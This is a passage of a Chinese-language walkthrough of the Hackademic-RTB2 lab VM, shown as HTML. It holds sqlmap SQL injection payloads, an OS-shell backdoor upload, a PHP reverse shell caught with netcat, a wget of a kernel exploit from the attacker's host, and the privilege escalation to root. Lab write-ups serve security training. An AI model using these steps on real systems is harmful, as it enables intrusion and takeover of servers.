/2019-12-12/</span><br><span class="line"></span><br><span class="line">[03:45:59] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[03:45:59] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[03:45:59] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: letter (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...<span class="string">&#x27; AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27;</span> AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&amp;Itemid=3</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...<span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&amp;Itemid=3</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">[03:46:02] [WARNING] unable to automatically retrieve the web server document root</span></span><br><span class="line"><span class="string">what do you want to use for writable directory?</span></span><br><span class="line"><span class="string">[1] common location(s) (&#x27;</span>/var/www/, /var/www/html, /var/www/htdocs, /usr/<span class="built_in">local</span>/apache2/htdocs, /usr/<span class="built_in">local</span>/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs<span class="string">&#x27;) (default)</span></span><br><span class="line"><span class="string">[2] custom location(s)</span></span><br><span class="line"><span class="string">[3] custom directory list file</span></span><br><span class="line"><span class="string">[4] brute force search</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] retrieved web server absolute paths: &#x27;</span>/index~.php<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] trying to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27; via LIMIT &#x27;</span>LINES TERMINATED BY<span class="string">&#x27; method</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] unable to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] trying to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27; via UNION method</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] expect junk characters inside the file as a leftover from UNION query</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the remote file &#x27;</span>/var/www/tmpussxf.php<span class="string">&#x27; is larger (701 B) than the local file &#x27;</span>/tmp/sqlmap2xlaxhqs4350/tmpgmt8uc8y<span class="string">&#x27; (700B)                                                                  </span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the file stager has been successfully uploaded on &#x27;</span>/var/www/<span class="string">&#x27; - http://192.168.84.142:666/tmpussxf.php</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the backdoor has been successfully uploaded on &#x27;</span>/var/www/<span class="string">&#x27; - http://192.168.84.142:666/tmpbmblb.php</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] calling OS shell. To quit type &#x27;</span>x<span class="string">&#x27; or &#x27;</span>q<span class="string">&#x27; and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">CHANGELOG.php</span></span><br><span class="line"><span class="string">COPYRIGHT.php</span></span><br><span class="line"><span class="string">CREDITS.php</span></span><br><span class="line"><span class="string">INSTALL.php</span></span><br><span class="line"><span class="string">LICENSE.php</span></span><br><span class="line"><span class="string">LICENSES.php</span></span><br><span class="line"><span class="string">Untitledt.png</span></span><br><span class="line"><span class="string">_installation</span></span><br><span class="line"><span class="string">administrator</span></span><br><span class="line"><span class="string">cache</span></span><br><span class="line"><span class="string">components</span></span><br><span class="line"><span class="string">configuration.php</span></span><br><span class="line"><span class="string">configuration.php-dist</span></span><br><span class="line"><span class="string">htaccess.txt</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">includes</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">index2.php</span></span><br><span class="line"><span class="string">language</span></span><br><span class="line"><span class="string">libraries</span></span><br><span class="line"><span class="string">logs</span></span><br><span class="line"><span class="string">media</span></span><br><span class="line"><span class="string">modules</span></span><br><span class="line"><span class="string">pC4Hp8kt@Px8PgkV$!</span></span><br><span class="line"><span class="string">plugins</span></span><br><span class="line"><span class="string">robots.txt</span></span><br><span class="line"><span class="string">templates</span></span><br><span class="line"><span class="string">tmp</span></span><br><span class="line"><span class="string">tmpbmblb.php</span></span><br><span class="line"><span class="string">tmpugano.php</span></span><br><span class="line"><span class="string">tmpupcaf.php</span></span><br><span class="line"><span class="string">tmpussxf.php</span></span><br><span class="line"><span class="string">tmpuxtor.php</span></span><br><span class="line"><span class="string">welcome</span></span><br><span class="line"><span class="string">xmlrpc</span></span><br><span class="line"><span class="string">xxx.html</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; </span></span><br></pre></td></tr></table></figure>

<p>下面使用–os-shell执行成功后sqlmap生成的上传payload上传kali中的php反弹木马来反弹shell,php反弹木马中修改端口和ip的操作不用我多说</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub46.jpg"></p>
<p>ls查看成功上传的木马，并且浏览器访问，kali端 nc -lvp 5566 监听返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">os-shell&gt; ls</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the <span class="built_in">command</span> standard output? [Y/n/a] <span class="built_in">command</span> standard output:</span><br><span class="line">---</span><br><span class="line">15285</span><br><span class="line">15285.c</span><br><span class="line">CHANGELOG.php</span><br><span class="line">COPYRIGHT.php</span><br><span class="line">CREDITS.php</span><br><span class="line">INSTALL.php</span><br><span class="line">LICENSE.php</span><br><span class="line">LICENSES.php</span><br><span class="line">Untitledt.png</span><br><span class="line">_installation</span><br><span class="line">administrator</span><br><span class="line">bullfuck.php</span><br><span class="line">cache</span><br><span class="line">components</span><br><span class="line">configuration.php</span><br><span class="line">configuration.php-dist</span><br><span class="line">htaccess.txt</span><br><span class="line">images</span><br><span class="line">includes</span><br><span class="line">index.php</span><br><span class="line">index2.php</span><br><span class="line">language</span><br><span class="line">libraries</span><br><span class="line">logs</span><br><span class="line">media</span><br><span class="line">modules</span><br><span class="line">pC4Hp8kt@Px8PgkV$!</span><br><span class="line">php-reverse-shell.php</span><br><span class="line">plugins</span><br><span class="line">robots.txt</span><br><span class="line">templates</span><br><span class="line">tmp</span><br><span class="line">tmpbmblb.php</span><br><span class="line">tmpugano.php</span><br><span class="line">tmpupcaf.php</span><br><span class="line">tmpussxf.php</span><br><span class="line">tmpuxtor.php</span><br><span class="line">welcome</span><br><span class="line">xmlrpc</span><br><span class="line">xxx.html</span><br><span class="line">---</span><br><span class="line">os-shell&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.84.142: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.84.135] from (UNKNOWN) [192.168.84.142] 42982</span><br><span class="line">Linux HackademicRTB2 2.6.32-24-generic <span class="comment">#39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux</span></span><br><span class="line"> 11:18:34 up  7:36,  0 users,  load average: 0.15, 0.11, 0.30</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id </span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>Hackademic-RTB2靶机所用的提权exp和Hackademic-RTB1靶机所用的一模一样，<span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>然后在kali中存在exp的目录下运行python一行代码在局域网中分享下载文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>
<p>然后在shell中执行命令下载该exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.84.135:8000/15285.c</span><br><span class="line">wget http://192.168.84.135:8000/15285.c</span><br><span class="line">--2019-12-13 05:38:57--  http://192.168.84.135:8000/15285.c</span><br><span class="line">Connecting to 192.168.84.135:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 7155 (7.0K) [text/plain]</span><br><span class="line">Saving to: `15285.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[======================================&gt;] 7,155       --.-K/s   in 0s      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2019-12-13 05:38:57 (893 MB/s) - `15285.c&#x27;</span> saved [7155/7155]</span><br></pre></td></tr></table></figure>

<p>编译并运行exp进行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc 15285.c -o 15285</span><br><span class="line">gcc 15285.c -o 15285</span><br><span class="line">$ ./15285</span><br><span class="line">./15285</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc08cac4c</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0773340</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc02f5060</span><br><span class="line"> [+] Resolved commit_creds to 0xc016dd80</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc016e0c0</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Restoring <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Got root!</span><br><span class="line"><span class="comment"># whoami </span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<p>That’s so great!!!Excellent!!!然后到root文件夹下找到key.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">Desktop  Key.txt</span><br><span class="line"><span class="comment"># cat Key.txt</span></span><br><span class="line">cat Key.txt</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAvQAAAFYCAIAAACziP9JAAAACXBIWXMAAAsTAAALEwEAmpwYAAAg</span><br><span class="line">AElEQVR4nOy9eZhdVZXw/bu35iFVlXmgUiQhBAIJEGKMAQGDb1rpbj5EjYK8KIoy+SniIyC2Q4uC</span><br><span class="line">Nn5tOzI4dAvaKI2CLTgEWmYIGTCBQAbIUEkqVZWa5+lO3x/nXefdt4Y71D3DvbfW78nDk1C3zll3</span><br><span class="line">n332XnuNoCiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span><br><span class="line">oiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span><br><span class="line">oiiKovhOwG8BlNynAM6AEYhCBGLQCd0Q8lswRVEUZUoS9FsAJfcphUIIQBAKICBajqIoiqL4gSo3</span><br><span class="line">SsYUi1oTlAkVgajPQimKoihTFlVulIyJicHG+m9MzTaKoiiKn6hyoziBpdlguKUURVEUxScK/RZA</span><br><span class="line">yX3C4pMCIhDQOHVFURTFT1S5UTLGUm4K5J8FiT6rKIqiKG6jyo2SMSEjlDgGQbXcKIqiKH6iMTdK</span><br><span class="line">xtiuqCAUQolOK0VRFMVP1HKjOEEYCiFqZE4piqIoik+ocqM4QRSKxD+FTitFUZQpSTVUwwC0+SyI</span><br><span class="line">7kKKE1jKjZ0BHpCCN4qiKMoU4V1QI6XOmmG7n7JocITiBCPSgSEgmVPqmXKPAqjyWwZFURSTpTAT</span><br><span class="line">QjAMEZgJ50OJb+Ko5UZxgigUymyyyhOrcuMSy+BtEIIheA66/ZZHURQFKIQwEF+w/nx4HZp8EEct</span><br><span class="line">N4oThKBIOkxZdW7UJ+UGNbAWwjAEUTjVb3kURVEs2oy0WWsjKIISWAnLfRBHlRvFIezG4EFJm1Ic</span><br><span class="line">52yIwYgsH8A0nyVSFEUBaIM2iEipM7M4yImwymtxVLlRnKBYVHVr042pcuMOsyASP9RFfoukKIpi</span><br><span class="line">8QIchg4IAVAIBaLfzIFTPJVFY24UJyg2bAmq1rhEAUyDXgiK+hjVHqWKomQTu6ECZkMdVEOpxN8E</span><br><span class="line">4UTog2MeCaLKjeIEJVBodGDQaGI3KDbsvZYGOSwRfIqiKFlCP/RDE6yAeVABMSiEclgC7TDkhRTq</span><br><span class="line">llKcoAIwfCU6rdzA9kZZwxuAATH/KoqiZBXD8AocgRE5khVDNSz06P66CylOUGpEE+uccgkrxz4o</span><br><span class="line">Zt4wjMCwz0IpiqJMyC7oACQzvBzmQLkXd9aNSHGCMqN8n1bwc4mQ4ZYKwCAM+C2SoihKYrbG13ed</span><br><span class="line">BfO8uK0qN4pzBI30P8VxwkYBiSCMwIjfIimKoiRmCA4Ydv0yqIZi12+ryo3iBANGwE1AtBzFccKS</span><br><span class="line">XVkgdfwURVGynF1QYewRNV40kFHlRnGCIWm/YAcUq3LjBsNGDy80mlhRlFxgGHqgSM5ms7wIu1Hl</span><br><span class="line">RnGCXtFs7D+q3LhBvzHOeGHaVRRFcYAWKJPTb4kk2LqJKjeKE7RKFRbTeKM4zhCUGH1b1C2lKEpO</span><br><span class="line">0AiVRuepQih194a6BSlOEJNNNyj+KbXcuMEgFMkCUaKB24qi5AhVUGq0ICyRivauoauj4gQh8ZVY</span><br><span class="line">jaXULeUSMbGQRaHM9dVBURTFGQqM0y8Sf+MmarlRnGDYqHCj2VLuERWLbhCmQYnf8iiKoqRCiRGO</span><br><span class="line">WWD0kHENtdwoTjBiBLoWqkXBNQqM4a2EMp/FURQlZwjAWgD6oAuOedvkuFJ2B6+a/qpyozhBwNBs</span><br><span class="line">Qlqk2DXso4811LaLSsknpsOHoBYOwiZo9FseJT/4MYRgBGIQhigcgtfgVU/KgZbGhy4MqeVGyQki</span><br><span class="line">RhyxtdeqcuMGxWK8CctoF6hyk1/UwhdhEHpgNlwB2+Fpv6VScp2LAOiBmCzOYZgPC+DvYCs86bIA</span><br><span class="line">0yV0IQox6He9L57G3ChOEDOsNdo70z3KxP1XqIOcp3wOBqBNlv4orIR3+iyUkvOcBZH4OmR22dUI</span><br><span class="line">rIBrXXZzz4WoWJ17YADCbt7OH8vNp6AWgD/BFh/ur7hCoREsprhEmawOMaNOsZI3nAGF0GJ4G60E</span><br><span class="line">k0WwD1r9FU7JWYKwEAaNpcOeXRHJyo7CxfCIOzpHISyCJtkgmqHPhbvE4/np73pYBcUQhbOgxuv7</span><br><span class="line">K64Qja9wo/qNS1QYNRILvI0HVDxglbxKpuZqqbML/JRLyW1qRI8pMNaNgPEnCBUwA85yR4AzoFzC</span><br><span class="line">MSPQBEPu3MjAc8vNSuiRYKIiWAJ/81oExXns/OQCCYZX3KBSyggVSFRgxG+RFAcphwHjn3a6bBj6</span><br><span class="line">/ZFISYlpUARD8Y9v0gSlVmfEof5xM8SOEYA2eBKOQTWsgaXiqIpCDZwIB6HDiZuavF+cYgXQAK2u</span><br><span class="line">B9zgtXJTCQUQlkNJpesFmBXvML256i5xiWlyzEI0G40mzifelNAE4guB9ECvb0IpcSyC86EcKqAK</span><br><span class="line">amCmvIkhaIej0AH10AE90AcD472nAfn1OTADFsAcmA7V4tmwAm97oAkaYSfsm6zMJcay3ACvQwha</span><br><span class="line">oBn+HhZLKlMM5sEip5Wb5XAG1MvCtRu6Hb3+BHir3BQZiaxRKJJB14N+rhMwDJ663bpHqeH1i7oe</span><br><span class="line">kad4zV+hFmbIwgjE4Bh0wXGfRVMAzoZbYVBevQhEoAPCsosVw6kQhPMkxyICMamRYZlhgvIim8Xc</span><br><span class="line">IzAMIeiSy1rEoAZmw9ugAPbAw9CVptjFRum8iBGN0guPwmVQC0UQg2kwB2rSv8VEFMH3JII4CHvh</span><br><span class="line">qCeZ5z64pWzlJmaoOJ58VcVd7PLEWuTGPYqM10d9UnnJ/XAWLJTwtUHogp1+S5VbFLj2apwFvdAz</span><br><span class="line">3o8CEqs7YhzXx57bC2AEehNWsbPXz5j8GYZhiMIcuBT+I33JC+RQNAuKDa/QCDwFV0CJbMoLYa9z</span><br><span class="line">ys39EIajUABd8Ip3NkhvlZsBuac182IymkquY1bOjak1zjWK5OAVk8VOyT92wk5prxGBTr/lySGq</span><br><span class="line">4LtQBQ3wkAvZuK/DmUapGBs7e9F+JQPGx2Jiv4nBiKHWWIvkMAzCAEQgLOkCRVBq1LWy79I/KbXD</span><br><span class="line">dnQGYD4Uxf+0AUJQIulU051L9LkfZsFh2RqehoMOXTkFvFVuhmEkPgtAyQ9Mt5Rqq+7RI4Frdo1R</span><br><span class="line">JV/p1Tib9PkMnADHoRw+DHXwsKPX3woLYL64HfqgDwYB0UKmiVJSBkVQKQ3gAkamhfXfVtgPx2DA</span><br><span class="line">OKgEjUuVQQmUQbmUIy+EKLyZvthhCeYFqsf7QAMsh2OykheNiW2fBL+AhXAUQhCAp2BbZhdME8/d</span><br><span class="line">Uv1QLJEZmjCcT9jVJ/WxukcvzIGQuqUUZTxKJa3MClo6Ezrgr47e4vcSCGzda0CSfwtFKSkVZSIA</span><br><span class="line">RfB2WGqoFFHohqfhMPRBVIw6iQnKAhua1FsflWiBYLx5yWYIZhrKzXQozky5eQRmQYPEnLwAm7w+</span><br><span class="line">jHmu3AxBOYxI2tRY+56SixTG50lpWLFLRKAMeiCgbilFGUOFuHWiUAgz4BxohD2O3qVngrCbcWmG</span><br><span class="line">j0uFKiAGL8OONO8YlWysyRESewwT1MeqgyL5UQBqoDyDsJtnoAAOSzGbZ+H3DuW0p4PnLoT++Nbn</span><br><span class="line">qtnkB4H4UjdhjblxhwJZg6wznCo3imJi1b63F6ISmA3rodI/kYZhH5TLP6NwwHMZorI+F07Qajci</span><br><span class="line">ao21L0+6REsJbIUCOCg1X56C3/mTM+S5cjNopNUE1HKTLxTIYy0ywooVxzlBxll7SynKKIpgpniI</span><br><span class="line">ZkA5BKAcToB3+SrYIMwSvWHEi+K8owkb1oRxU8kWQ7FRq2xyLu818DwMw0EjwGgoZf9QIUxP/6YJ</span><br><span class="line">r+ctfeKb1MjTfMKKdyuSDpoJshyVSVMGZ8MRKIYRibxRFMVijqTiBsUFMwQlMBOWwwGnnVOpE5Eq</span><br><span class="line">eVEjJdtLwvHddseuG6dBh2Fo6EzTi3QxfBLmQi80ABLZE4Vl0A9RyfwqgypRAPqhACpgJiyAuTAI</span><br><span class="line">u+HOjL6rjefKTbfU6tCCKHlGQCwKEamtqTjLp40UhsBkQwsVJV+pFvtEJQxDN/RJZHEtrINj6cTK</span><br><span class="line">OEgg3nDivXIzbCg3Y1fmZbAQnjX+T2M60cR3wIXQA4eMIi8R2QgWwokwH8rk1lEYltCFoKTH98Mh</span><br><span class="line">GIIi+BD8V0Zf18Jz5aZ9TBMi3QXzgEJ5aSNG/VzFQU6CT0BjfOUMRVFsKmS/HIJBGIYy+VEJ1MFa</span><br><span class="line">eNIPwUydpsgPl8WQIYAVPDBo/PQaKaBsqV+74XDKUTKnwzuhSbIc7K4Rdq0KKw76oPx/qy/suGtX</span><br><span class="line">VGQLQIkDzac8H2ZLlS4ygrdVuckbAupqdIcC+DOMQDMgfnFNSVMUE7s87AiMQCFUGT+dCStguR+C</span><br><span class="line">BaVKjRXjXOy5AIOGghWAOsN6dAZ8AA7I6n0InoaulNeW6dAJPdINJiJ/GTH+HhUzc1j+T0yWr6jx</span><br><span class="line">F+vYFnasp6YfqeC2/oh2/ssXCuMNcoqzvAhheMsIBgyo5UZR4hk22vuUww54BmrhbDgBArAAzoVm</span><br><span class="line">z4s+W5tdUN5fz3fd/xsnYJ2LLpJiPP8LPgt9cBiAXtgErelceSd0izvJVlbC8X+JjPHS2H8xi+5Y</span><br><span class="line">/qkDjvUM96OIX4GRUKOaTX5QaCwr+lid5b9gppQlXQStUC+VMFWPVBSbIWMVisAW2AmvQS9cJGX3</span><br><span class="line">ToRz4XHPZbOOfzGp8ud9g5phSfCOwBo4E5bBbGiGV8Wu87iEA6dOH9wDp0vLrR4puDzsaaeFcfFc</span><br><span class="line">uTG9j2HdCPMIuweKbroO8g1Ya7jA+6EHOmC2tgRXlHjsMBHLUtIphoFnYaX4g6bDMjgZ3vJQMLv0</span><br><span class="line">iWW8KZ447sQ9+qBS0qZKoRAOw34ZtAC8lH5pQYuXYSdUSFxw1qz/nodIBOKzpZT8wA4oDmbR5M55</span><br><span class="line">roSrocVI8WiGRom80ZQ0RTHpBoy8JPPt+JnUlLO6Xq8zYo09wIq5KRYLd7EfsYnDcveZ0h5rnthy</span><br><span class="line">gjAAf8rg4kPQLq3Os2ZR8iP+s1CO+PZBX8l17ENJhm6pUqhzUq4cZjn8f9AJLUYCQgHMhNP9cNsr</span><br><span class="line">SpbTLX8JGmctiyFJdbZKrSyBld7KViDJ2FZHTO8P9v2iVM2BRTAdonAMOgDYmYddWj1XbgplIywa</span><br><span class="line">T79WcpRCebIFGVhuvgE74LfwHw5Ll5M8AwPQIKmtwxJ9Xwjl+tYoyhhGICxqhJ2Na/O47O4BmA+n</span><br><span class="line">xudSuYqtbNkNt70/nITFvm6lMlVAO2yRXhCTbiOVxfih3BQYB30t4pcfFBqWm8m1DLsR/je0wjFo</span><br><span class="line">g1XOy5hLPAMhWXf+G74An4Y/QLtRCEvJYxbDd+HDfouRc3QYekPRmIXoCSiTk9gyWOqVVKZhG9kE</span><br><span class="line">PSYsN+2AJ+B6+Aw8CR0QhNN8bb/lDn4oN4WiwGrjzHzCrDqd7mMtgS/CcegSw89UdrvcDCvhKETg</span><br><span class="line">93A/HIEOeAQqACmEpeQrdfAibIBPw8PeRofkOp1SkhjpLWXyhNT+D8JcWJpBh8h0KTD2vlI/3t8R</span><br><span class="line">uWkrHIImqIaTYD4AdfCefJtpfuwhBWIc04DivGFUWfF0nSZfgyFokTJQvWl2NsknToEvQxP0i5PO</span><br><span class="line">riU6DCdBPSBNalTFyUv+A3rgOERgGC52phr9lKAPiqHfiHww6YJdsASGoQgWwUJP0qbsTrdFcjLx</span><br><span class="line">fu+LSXOrKJwMl8EiCMmSWwor5TSVL3i+OpYazgvUcpMvjHpX01VuPi4ZQFbdpyb55xTkAeiFRuiB</span><br><span class="line">340pqGWd/yyfVFBfn3xkCZwMrRJFXupHQdvcZUAO7FGoG+/w/iLMlH2vDuZ4IpXdW8peGH1xK1sB</span><br><span class="line">kSVQBSeNqSUxD06Dq8Q8nPt4rtzYNkNbe9UFOm+wZ1Nays2XIAytcobYDYemqnLzKVgKDRCFTfBa</span><br><span class="line">wg+r2SYvORFCUn0kAiHo91miXMJq92glbJ443j79OpRJod5KmA/TPBHMDEb0JR6j0AjXi8Kj8Am4</span><br><span class="line">BZ42evHWwlL4PJzluXgu4Idyg6g1QV2g8wU7QyqQZk/H+XATHIMRCME+2A5b3RIz2/k2tMIANMIz</span><br><span class="line">E/Sui8p/sypk7Z3wT/ABv8XIA2IQku05Bn1GhrOSlCGjs+z88Sw3R6BLbBgBOBFmui+V6abw8Ugf</span><br><span class="line">MJo6PQuD0AB/gTegVxbw6VAFF8O7/ZDQUTyPubFNrEF5h6can4Gz4Qj8KM0uHplTBOfBuVAAP4Vj</span><br><span class="line">Tl/fLseS+mP9BfTAUYjCHtgMr2RrxYXPwmo4Ct9358F9HcJitvkfODLeMEaNMllZkmz4brgZ6qAb</span><br><span class="line">1sHJ8G2/RcppmsWEaW1CbdDmuQyFcD6sgwL4uQsLhXuMGHrh9DHZ4Bb74STZfSzlpt5jKf3Y+Erl</span><br><span class="line">2Gn1sLTrgjbBX6EMThR1oAJK4FwYgec9l9M5PFduSuQvdjvQKcUd8EFohiic62301o1wLQxDH3TC</span><br><span class="line">V+CLzpU3MBs6BlN+da+H0+ENiEIXbIdtUlQq27gDPgJNEHPtwV0NzRCBZnglYeu4bNBpgBXwbVgG</span><br><span class="line">XXAQ+qT1XZWxdCrp0iqvjxXs2ea5rn8jfAqGoB+6YA58OXfqoITlAIAUzRtLI6yETohBBVR4W27N</span><br><span class="line">r/N8jdHDMhzvM9kHs6EYTpD/XwKz4DxogX3+yJs5nis3pcYQk2Wmdbcpho/AYWiBkIedaU+A/4ZS</span><br><span class="line">aBSTQwSOwxnwnEO3sBWaWMqJAEvga3AIOiACL8LubNVsiuGjcASOQ8idhf59EIVmiMErcGwCvT82</span><br><span class="line">5o9f3AmXQzccgD7ZUcKq1mSMNbusYE/rnO1Eh+SUsBaKEmiEdika2eboQuE2w0ZOUBSK5J8mr8I/</span><br><span class="line">Gl2yLf2mz02p7GCXmPFPj5kphUAj463SL0A1lMBs2ZFLYB5cCA25GvXlh+XGDsiIZo1pPXPOhYug</span><br><span class="line">ABZACRyDBngKXjU+8/cwIhmeBV41TjsHfgUd8KYxua28awd9K0E5M5FyFs9T0AaHIAQH4Q047Jw8</span><br><span class="line">qWM9uCDMgzJohAZ4GnYan/lHCMuDc6nj3RWiIoRgp4T4jSUsZwP8OxjMgSegFA5LUk9UBLM2RdVv</span><br><span class="line">MiEijzgs7ZC8SRs+B/4TWmGflPqNwoDTC4Xb1BjGm4iUTR9Fq0TXRuVXylxWbgpEHuvhjvjhsqiS</span><br><span class="line">rpZRKXQ+yl71R6iCQpghAUklUAtn56pzynPlZqbhUbZwZIG+GpbBy/CoE1dLnVL4OpwP02EYBiEG</span><br><span class="line">gzALzoT3wDBsgoegHWbJd7fWLA+Umwvg53Ac6uXVAo7DAXgT9jh3o6BhSyhL4WjyOxiBXRCGIdgK</span><br><span class="line">B71tk1sKX4MLoBpGYAhiMASz5cGNwCb4zZgH54ZWOgtWik+qUcKrxyUYb7PxXrm5EH4OfaIrR43N</span><br><span class="line">uBl2xiuFeYyrjoxe0Rcj4ud1mwvgZ9AM9RKMEoNmOAD7HV0o3KZZwm5iUtllLI2G6yoKVUawhEuM</span><br><span class="line">OhENj0nDdpsCqIA22QVCE+z8v4arYJkRZD0LzoA3stWmnhDPlZs+eXkizlluboKPQBtUwh7Y64CY</span><br><span class="line">KXED3AQj0AH7jRcGeamsmfROOAeOwQfhOIyIbue2cfJCuBeOw2FZK9tgN7TAXtjv6L1ihsJakeys</span><br><span class="line">eSOcDbvEkrQd9nnopAOug89BCNrhgLHQBIxUixi8E86FY3AZNEsMhBu8HaLQAxF4Ddon/mRUDlX4</span><br><span class="line">Ydz+IPwLtMJheeIj0A5HoVHscIc8l8qKfl0Os+GRZPnzjvA9WAtN8Et3TlOWHyoilkK3eTfcCy1w</span><br><span 